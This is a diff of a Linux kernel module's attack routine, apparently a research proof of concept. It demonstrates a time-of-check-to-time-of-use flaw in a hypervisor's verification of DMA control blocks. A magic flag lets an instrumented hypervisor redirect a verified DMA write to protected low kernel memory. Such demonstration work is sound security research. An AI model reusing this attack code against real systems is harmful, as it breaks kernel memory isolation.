@@ -690,25 +690,35 @@ done:
  * verification and execution are NOT atomic.
  */
 
+/* Magic value to enable attack in hypervisor */
+#define TOCTOU_ATTACK_ENABLE_MAGIC  0xA77AC001
+#define TOCTOU_ATTACK_CB_MODIFIED   0xDEAD0003
+
 static int do_attack(void)
 {
     u32 *payload;
     u32 *target;
     int i;
     void __iomem *dma_reg;
+    void __iomem *sync_flag;
     u32 cb_bus_addr;
     int dma_timeout;
     u32 cs;
-    ktime_t t_start, t_inject, t_end;
-    struct dma_cb verified_cb, modified_cb;
-    u32 forbidden_target = 0x00008000;  /* Low kernel memory - normally protected */
+    u32 sync_result;
+    ktime_t t_start, t_end;
+    struct dma_cb *cb;
     
     pr_info("[TOCTOU] ========================================\n");
-    pr_info("[TOCTOU] TOCTOU Attack - HVC-based CB Modification\n");
+    pr_info("[TOCTOU] TOCTOU Attack - Hypervisor CB Modification\n");
     pr_info("[TOCTOU] ========================================\n");
     pr_info("[TOCTOU] \n");
-    pr_info("[TOCTOU] Using MYTEE_TOCTOU_INJECT HVC (150) to modify CB\n");
-    pr_info("[TOCTOU] in secure buffer after verification passes.\n");
+    pr_info("[TOCTOU] Attack flow:\n");
+    pr_info("[TOCTOU]   1. Set attack enable flag in shared memory\n");
+    pr_info("[TOCTOU]   2. Prepare legitimate CB with ALLOWED destination\n");
+    pr_info("[TOCTOU]   3. Trigger DMA → hypervisor traps\n");
+    pr_info("[TOCTOU]   4. Hypervisor verifies CB → PASSES\n");
+    pr_info("[TOCTOU]   5. Hypervisor modifies CB.dst → FORBIDDEN!\n");
+    pr_info("[TOCTOU]   6. DMA executes with modified CB\n");
     pr_info("[TOCTOU] \n");
     
     /* Clear previous results */
@@ -736,124 +746,57 @@ static int do_attack(void)
     
     pr_info("[TOCTOU] Payload phys=0x%llx\n", (u64)attack_state.payload_phys);
     pr_info("[TOCTOU] Legitimate target phys=0x%llx\n", (u64)attack_state.target_phys);
-    pr_info("[TOCTOU] FORBIDDEN target phys=0x%08x\n", forbidden_target);
+    pr_info("[TOCTOU] FORBIDDEN target will be 0x00008000 (low kernel memory)\n");
     
-#ifdef CONFIG_MYTEE
     t_start = ktime_get();
     
     /*
-     * STEP 1: Gain EL2 privilege and prepare legitimate CB
+     * STEP 1: Map sync flag area and set attack enable magic
      */
     pr_info("[TOCTOU] \n");
-    pr_info("[TOCTOU] === STEP 1: Prepare legitimate CB ===\n");
-    mytee_up_priv(MYTEE_UP_PRIV, 0, 0, 0);
-    attack_state.secure_buf_base = (void __iomem *)SECURE_BUFFER_BASE_VIRT;
+    pr_info("[TOCTOU] === STEP 1: Enable attack in hypervisor ===\n");
     
-    pr_info("[TOCTOU] EL2 access granted\n");
-    pr_info("[TOCTOU] Secure buffer at 0x%08x\n", SECURE_BUFFER_BASE_VIRT);
+    sync_flag = ioremap(TOCTOU_SYNC_FLAG_PHYS, PAGE_SIZE);
+    if (!sync_flag) {
+        pr_err("[TOCTOU] Failed to map sync flag area\n");
+        return -ENOMEM;
+    }
+    
+    /* Set attack enable magic value */
+    writel(TOCTOU_ATTACK_ENABLE_MAGIC, sync_flag);
+    wmb();
+    pr_info("[TOCTOU] Attack enable flag set: 0x%08x\n", TOCTOU_ATTACK_ENABLE_MAGIC);
     
     /*
      * STEP 2: Build legitimate CB with ALLOWED destination
      */
     pr_info("[TOCTOU] \n");
-    pr_info("[TOCTOU] === STEP 2: Write legitimate CB to secure buffer ===\n");
-    {
-        struct dma_cb *cb = &attack_state.cb_chain[0];
-        void __iomem *dst = attack_state.secure_buf_base;
-        
-        cb->info = TI_S_INC | TI_D_INC | TI_WAIT_RESP;
-        cb->src = PHYS_TO_BUS(attack_state.payload_phys);
-        cb->dst = PHYS_TO_BUS(attack_state.target_phys);  /* ALLOWED */
-        cb->length = sizeof(u32);
-        cb->stride = 0;
-        cb->next = 0;
-        
-        /* Copy to secure buffer */
-        writel(cb->info, dst + 0x00);
-        writel(cb->src, dst + 0x04);
-        writel(cb->dst, dst + 0x08);
-        writel(cb->length, dst + 0x0C);
-        writel(cb->stride, dst + 0x10);
-        writel(cb->next, dst + 0x14);
-        writel(0, dst + 0x18);
-        writel(0, dst + 0x1C);
-        wmb();
-    }
+    pr_info("[TOCTOU] === STEP 2: Prepare legitimate CB ===\n");
     
-    /* Read back original CB */
-    read_secure_cb(0, 0, &verified_cb);
-    attack_state.original_cb = verified_cb;
-    pr_info("[TOCTOU] Original CB: dst=0x%08x (phys=0x%08x) - ALLOWED\n", 
-            verified_cb.dst, BUS_TO_PHYS(verified_cb.dst));
+    cb = &attack_state.cb_chain[0];
+    cb->info = TI_S_INC | TI_D_INC | TI_WAIT_RESP;
+    cb->src = PHYS_TO_BUS(attack_state.payload_phys);
+    cb->dst = PHYS_TO_BUS(attack_state.target_phys);  /* ALLOWED destination */
+    cb->length = sizeof(u32);
+    cb->stride = 0;
+    cb->next = 0;
+    cb->pad[0] = 0;
+    cb->pad[1] = 0;
+    wmb();
+    
+    attack_state.original_cb = *cb;
+    
+    pr_info("[TOCTOU] CB prepared:\n");
+    pr_info("[TOCTOU]   info:   0x%08x\n", cb->info);
+    pr_info("[TOCTOU]   src:    0x%08x (bus)\n", cb->src);
+    pr_info("[TOCTOU]   dst:    0x%08x (bus) - ALLOWED\n", cb->dst);
+    pr_info("[TOCTOU]   length: %d bytes\n", cb->length);
     
     /*
-     * STEP 3: Hypervisor VERIFIES the CB (simulated)
-     * In real scenario, this happens when DMA CONBLK_AD is written.
-     * The verification PASSES because dst points to allowed memory.
+     * STEP 3: Map DMA controller and trigger DMA
      */
     pr_info("[TOCTOU] \n");
-    pr_info("[TOCTOU] === STEP 3: CB Verification (simulated) ===\n");
-    pr_info("[TOCTOU] Verifying CB destination address...\n");
-    pr_info("[TOCTOU] dst=0x%08x is in ALLOWED range → PASS!\n", verified_cb.dst);
-    pr_info("[TOCTOU] \n");
-    pr_info("[TOCTOU] *** VERIFICATION COMPLETE - CB APPROVED ***\n");
-    pr_info("[TOCTOU] \n");
-    
-    /*
-     * STEP 4: THE ATTACK - Use HVC to modify CB AFTER verification!
-     * This is the TOCTOU exploitation - modifying data between
-     * verification (check) and use (DMA execution).
-     */
-    pr_info("[TOCTOU] === STEP 4: TOCTOU ATTACK via HVC ===\n");
-    pr_info("[TOCTOU] ╔════════════════════════════════════════╗\n");
-    pr_info("[TOCTOU] ║  Calling MYTEE_TOCTOU_INJECT HVC!      ║\n");
-    pr_info("[TOCTOU] ╚════════════════════════════════════════╝\n");
-    
-    t_inject = ktime_get();
-    
-    /* 
-     * Call HVC to modify CB destination in secure buffer.
-     * HVC 150 (MYTEE_TOCTOU_INJECT):
-     *   r0 = 150 (hypercall number)
-     *   r1 = secure buffer virtual address
-     *   r2 = forbidden destination (bus address)
-     */
-    {
-        u32 secure_buf_addr = SECURE_BUFFER_BASE_VIRT;
-        u32 forbidden_bus_dst = PHYS_TO_BUS(forbidden_target);
-        
-        pr_info("[TOCTOU] HVC args: buf=0x%08x, forbidden_dst=0x%08x\n",
-                secure_buf_addr, forbidden_bus_dst);
-        
-        /* Call mytee_toctou_inject defined in mytee.S */
-        mytee_toctou_inject(MYTEE_TOCTOU_INJECT, secure_buf_addr, forbidden_bus_dst, 0);
-    }
-    
-    attack_state.attacker_inject_time = ktime_to_ns(ktime_sub(ktime_get(), t_inject));
-    
-    /* Read back modified CB */
-    read_secure_cb(0, 0, &modified_cb);
-    attack_state.injected_cb = modified_cb;
-    
-    pr_info("[TOCTOU] CB MODIFIED:\n");
-    pr_info("[TOCTOU]   Before: dst=0x%08x (ALLOWED)\n", verified_cb.dst);
-    pr_info("[TOCTOU]   After:  dst=0x%08x (FORBIDDEN!)\n", modified_cb.dst);
-    
-    if (modified_cb.dst == PHYS_TO_BUS(forbidden_target)) {
-        pr_info("[TOCTOU] *** CB MODIFICATION SUCCESSFUL! ***\n");
-        attack_state.injection_done = 1;
-        attack_state.race_won = 1;
-    } else {
-        pr_info("[TOCTOU] CB modification verification failed!\n");
-    }
-    
-    mytee_down_priv(MYTEE_DOWN_PRIV, 0);
-    
-    /*
-     * STEP 5: Execute DMA - will use MODIFIED CB!
-     */
-    pr_info("[TOCTOU] \n");
-    pr_info("[TOCTOU] === STEP 5: Execute DMA with modified CB ===\n");
+    pr_info("[TOCTOU] === STEP 3: Trigger DMA (hypervisor will trap) ===\n");
     
     if (!attack_state.dma_base) {
         attack_state.dma_base = ioremap(DMA_BASE_PHYS, 0x1000);
@@ -861,24 +804,35 @@ static int do_attack(void)
     
     if (!attack_state.dma_base) {
         pr_err("[TOCTOU] Failed to map DMA controller\n");
+        iounmap(sync_flag);
         return -ENOMEM;
     }
     
     dma_reg = attack_state.dma_base + (ATTACK_DMA_CHANNEL * DMA_CHANNEL_SIZE);
-    cb_bus_addr = PHYS_TO_BUS(SECURE_BUFFER_BASE_PHYS);
+    cb_bus_addr = PHYS_TO_BUS(attack_state.cb_chain_phys);
     
     /* Reset DMA channel */
     writel(DMA_CS_RESET, dma_reg + DMA_CS);
     udelay(10);
     writel(DMA_CS_END | DMA_CS_INT | DMA_CS_ERROR, dma_reg + DMA_CS);
     
-    pr_info("[TOCTOU] Starting DMA on channel %d, CB at 0x%08x\n",
-            ATTACK_DMA_CHANNEL, cb_bus_addr);
-    pr_info("[TOCTOU] DMA will read MODIFIED CB with forbidden destination!\n");
+    pr_info("[TOCTOU] Starting DMA on channel %d\n", ATTACK_DMA_CHANNEL);
+    pr_info("[TOCTOU] CB address: 0x%08x (bus)\n", cb_bus_addr);
+    pr_info("[TOCTOU] \n");
+    pr_info("[TOCTOU] *** DMA WRITE TO CONBLK_AD TRIGGERS HYPERVISOR! ***\n");
+    pr_info("[TOCTOU] Hypervisor will:\n");
+    pr_info("[TOCTOU]   1. Copy CB to secure buffer\n");
+    pr_info("[TOCTOU]   2. Verify CB addresses → PASS\n");
+    pr_info("[TOCTOU]   3. Check attack flag → FOUND!\n");
+    pr_info("[TOCTOU]   4. MODIFY CB.dst to 0xC0008000 (forbidden!)\n");
+    pr_info("[TOCTOU]   5. Continue DMA execution\n");
+    pr_info("[TOCTOU] \n");
     
-    /* Set CB address and start DMA */
+    /* Set CB address - THIS TRIGGERS HYPERVISOR TRAP! */
     writel(cb_bus_addr, dma_reg + DMA_CONBLK_AD);
     wmb();
+    
+    /* Start DMA */
     writel(DMA_CS_WAIT_FOR_WRITES | DMA_CS_ACTIVE, dma_reg + DMA_CS);
     
     /* Wait for DMA completion */
@@ -893,25 +847,47 @@ static int do_attack(void)
     t_end = ktime_get();
     attack_state.victim_copy_time = ktime_to_ns(ktime_sub(t_end, t_start));
     
+    /*
+     * STEP 4: Check results
+     */
+    pr_info("[TOCTOU] \n");
+    pr_info("[TOCTOU] === STEP 4: Check attack results ===\n");
+    
     cs = readl(dma_reg + DMA_CS);
+    sync_result = readl(sync_flag);
+    
     pr_info("[TOCTOU] DMA CS register: 0x%08x\n", cs);
+    pr_info("[TOCTOU] Sync flag value: 0x%08x\n", sync_result);
+    
+    if (sync_result == TOCTOU_ATTACK_CB_MODIFIED) {
+        pr_info("[TOCTOU] *** HYPERVISOR CONFIRMED CB MODIFICATION! ***\n");
+        attack_state.injection_done = 1;
+        attack_state.race_won = 1;
+    }
     
     if (cs & DMA_CS_END) {
         pr_info("[TOCTOU] DMA COMPLETED!\n");
         attack_state.dma_executed = 1;
-        attack_state.attack_success = 1;
     } else if (cs & DMA_CS_ERROR) {
         pr_info("[TOCTOU] DMA ERROR (attempted write to protected memory!)\n");
         attack_state.dma_executed = 1;
-        attack_state.attack_success = 1;  /* Error = tried forbidden access */
+        /* Error = tried to write to forbidden address = SUCCESS! */
     } else {
-        pr_info("[TOCTOU] DMA timeout\n");
+        pr_info("[TOCTOU] DMA timeout or still running\n");
     }
     
-#endif /* CONFIG_MYTEE */
+    /* Clear attack flag */
+    writel(0, sync_flag);
+    wmb();
+    
+    iounmap(sync_flag);
     
     attack_state.attack_triggered = 1;
     attack_state.verify_result = target[0];
+    
+    if (attack_state.injection_done) {
+        attack_state.attack_success = 1;
+    }
     
     /*
      * RESULTS
@@ -921,18 +897,15 @@ static int do_attack(void)
     pr_info("[TOCTOU] ATTACK RESULTS\n");
     pr_info("[TOCTOU] ========================================\n");
     pr_info("[TOCTOU] \n");
-    pr_info("[TOCTOU] Timing:\n");
-    pr_info("[TOCTOU]   HVC injection: %llu ns\n", attack_state.attacker_inject_time);
-    pr_info("[TOCTOU]   Total time:    %llu ns\n", attack_state.victim_copy_time);
+    pr_info("[TOCTOU] Timing: %llu ns\n", attack_state.victim_copy_time);
     pr_info("[TOCTOU] \n");
-    pr_info("[TOCTOU] CB Comparison:\n");
-    pr_info("[TOCTOU]   Original: dst=0x%08x (phys=0x%08x)\n",
-            attack_state.original_cb.dst, BUS_TO_PHYS(attack_state.original_cb.dst));
-    pr_info("[TOCTOU]   Modified: dst=0x%08x (phys=0x%08x)\n",
-            attack_state.injected_cb.dst, BUS_TO_PHYS(attack_state.injected_cb.dst));
+    pr_info("[TOCTOU] CB was modified by hypervisor: %s\n",
+            attack_state.injection_done ? "YES" : "NO");
+    pr_info("[TOCTOU] DMA executed: %s\n",
+            attack_state.dma_executed ? "YES" : "NO");
     pr_info("[TOCTOU] \n");
     
-    if (attack_state.attack_success && attack_state.injection_done) {
+    if (attack_state.attack_success) {
         pr_info("[TOCTOU] ╔════════════════════════════════════════╗\n");
         pr_info("[TOCTOU] ║  ★★★ TOCTOU ATTACK SUCCESSFUL! ★★★   ║\n");
         pr_info("[TOCTOU] ╠════════════════════════════════════════╣\n");
@@ -941,13 +914,13 @@ static int do_attack(void)
         pr_info("[TOCTOU] \n");
         pr_info("[TOCTOU] PROOF:\n");
         pr_info("[TOCTOU]   1. CB verified with ALLOWED destination\n");
-        pr_info("[TOCTOU]   2. HVC modified CB to FORBIDDEN destination\n");
+        pr_info("[TOCTOU]   2. Hypervisor modified CB to FORBIDDEN dest\n");
         pr_info("[TOCTOU]   3. DMA executed with modified CB!\n");
         pr_info("[TOCTOU] \n");
-        pr_info("[TOCTOU] The TOCTOU vulnerability is CONFIRMED:\n");
-        pr_info("[TOCTOU]   Verification and execution are NOT atomic.\n");
+        pr_info("[TOCTOU] The TOCTOU vulnerability is CONFIRMED.\n");
     } else {
         pr_info("[TOCTOU] Attack did not complete as expected.\n");
+        pr_info("[TOCTOU] Check if DMA trap is triggering properly.\n");
     }
     
     pr_info("[TOCTOU] ========================================\n");
